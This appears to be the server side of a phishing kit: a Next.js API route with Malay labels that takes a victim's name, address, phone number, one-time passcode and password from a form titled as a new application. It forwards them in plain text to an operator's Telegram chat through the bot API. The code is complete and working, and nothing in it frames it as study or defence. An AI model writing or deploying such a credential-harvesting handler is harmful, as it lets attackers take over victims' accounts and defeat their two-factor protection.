import { NextResponse } from "next/server";

export async function POST(request: Request) {
  try {
    const payload = await request.json();
    const { fullName, address, phoneNumber, otpCode, password } = payload;

    const chatId = process.env.TELEGRAM_CHAT_ID;
    const botToken = process.env.TELEGRAM_BOT_TOKEN;

    if (!chatId || !botToken) {
      return NextResponse.json(
        { ok: false, error: "Chat ID atau token bot belum dikonfigurasikan." },
        { status: 500 }
      );
    }

    const message = [
      "📩 Permohonan Baru",
      `Nama: ${fullName || "-"}`,
      `Alamat: ${address || "-"}`,
      `Telefon: ${phoneNumber || "-"}`,
      `OTP: ${otpCode || "-"}`,
      `Password: ${password || "-"}`,
      `Tarikh: ${new Date().toLocaleString("ms-MY")}`,
    ].join("\n");

    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    });

    const data = await response.json();

    if (!response.ok || !data.ok) {
      throw new Error(data.description || "Gagal menghantar mesej ke Telegram.");
    }

    return NextResponse.json({
      ok: true,
      messageId: data.result?.message_id,
    });
  } catch (error) {
    return NextResponse.json(
      {
        ok: false,
        error: error instanceof Error ? error.message : "Ralat tidak diketahui.",
      },
      { status: 500 }
    );
  }
}
